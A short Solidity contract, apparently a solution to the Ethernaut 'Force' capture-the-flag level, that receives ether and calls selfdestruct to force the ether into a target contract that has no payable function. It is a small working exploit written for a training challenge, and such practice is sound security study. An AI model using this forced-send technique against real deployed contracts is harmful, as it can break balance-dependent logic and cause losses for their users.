// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

/*
    https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea
    https://cmichel.io/ethernaut-solutions/
 */
contract ForceSend {

    // Force force = Force(0xFf230362E37dF7739bcDf54A267edC6893baD506);

    function fund(address payable _target) public payable {
        require(msg.value > 0);
        selfdestruct(_target);
    }
}